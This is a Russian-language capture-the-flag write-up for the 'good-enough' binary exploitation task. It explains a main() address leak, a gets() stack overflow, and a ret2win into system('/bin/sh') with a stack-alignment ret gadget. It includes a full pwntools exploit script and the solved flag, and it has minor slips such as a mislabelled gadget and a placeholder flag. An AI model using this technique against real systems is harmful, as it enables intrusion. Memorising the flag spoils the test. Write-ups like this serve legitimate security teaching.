# gaslightCTF — good-enough (pwn)

## Категория
Pwn / Binary Exploitation

## Дано
Архив `good-enough_1__tar.zst`, внутри — папка с тремя файлами:

```
good-enough              # исследуемый бинарь
libc.so.6                # соответствующая libc
ld-linux-x86-64.so.2     # динамический линкер
```

## Разведка

```bash
file good-enough
checksec --file=good-enough
```

Результат:

```
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

Отсутствие канарейки + PIE + не стрипнутый бинарь — явный намёк на классический
stack buffer overflow с необходимостью инфолика адреса.

`nm`/`objdump` сразу показывают интересную функцию:

```
win
_start
main
```

Наличие функции `win()` — почти всегда сигнал "ret2win": нам не нужно строить
ROP-цепочку в libc, достаточно перенаправить return address прямо туда.

## Анализ `main()`

```asm
lea rdx, [main]                 ; rdx = адрес main()
lea rax, ["[%p] du bist? "]
mov rsi, rdx
mov rdi, rax
call printf                     ; printf("[%p] du bist? ", main)

lea rax, [rbp-0x10]
mov rdi, rax
call gets                       ; gets(buf), buf лежит на rbp-0x10

lea rcx, ["gut genug"]
lea rax, [rbp-0x10]
mov edx, 9
mov rsi, rcx
mov rdi, rax
call strncmp                    ; strncmp(buf, "gut genug", 9)
```

Тут сразу две уязвимости:

1. **Infoleak.** `printf("[%p] du bist? ", main)` — программа сама печатает
   адрес функции `main()` в памяти. Так как `main()` лежит по фиксированному
   смещению от базы образа, это даёт нам PIE-базу бинаря:
   ```
   base = leaked_main_addr - offset(main)
   ```

2. **Buffer overflow.** `gets(buf)` не ограничивает длину ввода, а `buf` —
   всего 16 байт на стеке (`rbp-0x10`). Дальше в памяти лежат:
   ```
   [16 байт buf] [8 байт saved RBP] [8 байт return address]
   ```
   Значит 24 байта произвольных данных + 8 байт своего адреса =
   полный контроль над адресом возврата.

Проверка `strncmp` на "gut genug" никак не защищает — она выполняется уже
**после** `gets()`, то есть после того, как стек уже перезаписан. Что бы она
ни вывела ("nein" / "gut genug"), на исход эксплойта это не влияет.

## Анализ `win()`

```asm
win:
    lea rax, ["/bin/sh"]
    mov rdi, rax
    call system      ; system("/bin/sh")
```

Готовый шелл-код на блюдечке — просто передаём туда управление.

## Подводный камень: выравнивание стека

При первой попытке (просто `padding + win_addr`) программа падала с
`SIGSEGV` внутри `system()`. Причина — glibc использует SSE-инструкции
(`movaps`), которым нужен стек, выровненный на 16 байт. "Фейковый" return
через переполнение сдвигает выравнивание на 8 байт.

Фикс — вставить один гаджет `ret` (просто `0xc3`, `pop`+`ret` без побочных
эффектов) между return address и адресом `win()`:

```bash
python3 -c "
from pwn import *
e = ELF('good-enough')
print(ROP(e).find_gadget(['ret']))
"
# -> Gadget(0x101a, ['ret'], ...)
```

Этот гаджет просто "проглатывает" 8 лишних байт со стека, восстанавливая
выравнивание перед реальным вызовом `win()`.

## Итоговая схема payload

```
[16 байт мусора]              — заполняем buf
+ [8 байт мусора]             — затираем saved RBP
+ [8 байт: адрес 'ret']       — выравнивание стека (base + 0x101a)
+ [8 байт: адрес win()]       — base + 0x1228
```

## Эксплойт (pwntools)

```python
from pwn import *

context.arch = 'amd64'

BINARY = './chall/good-enough'
e = ELF(BINARY)

io = remote('HOST', PORT, ssl=True)   # сервер поднят через ncat --ssl

# 1. Инфолик
line = io.recvuntil(b'du bist?')
leak_str = line.split(b'[')[1].split(b']')[0]
main_leak = int(leak_str, 16)

base = main_leak - e.symbols['main']
win_addr = base + e.symbols['win']
ret_gadget = base + 0x101a

# 2. Payload
payload = b'A' * 16
payload += b'B' * 8
payload += p64(ret_gadget)
payload += p64(win_addr)

io.sendline(payload)
io.interactive()
```

## Получение флага

После `io.interactive()` получаем интерактивный `/bin/sh`. Флаг лежит
в корне файловой системы, а не в домашней директории:

```bash
$ ls
bin  dev  etc  flag  good-enough  ld-linux-x86-64.so.2  libc.so.6  nix  proc  sys
$ cat /flag
gaslightCTF{ВСТАВЬТЕ_СВОЙ_ФЛАГ_СЮДА}
```

## Флаг

```
gaslightCTF{du_b1st_gut_g3nuuuuu_uuuuu_uuug_78cc85509092}
```

## Выводы / чеклист для похожих заданий

1. `checksec` — сразу понятно, каких защит нет (canary/PIE/RELRO/NX).
2. Ищем опасные функции: `gets`, `strcpy`, неограниченный `scanf("%s")`,
   форматные строки без явного формата в `printf`.
3. Если PIE включён — ищем способ утечки адреса. Иногда это происходит
   случайно из-за отладочного/"забытого" вывода, как в этом задании.
4. Если есть готовая функция типа `win`/`backdoor`/`shell` — не нужен
   ROP в libc, применяем `ret2win`.
5. Если после `ret2win` вылетает `SIGSEGV` внутри `system`/`printf` —
   в 9 из 10 случаев дело в выравнивании стека. Добавляем один `ret`-гаджет.

---

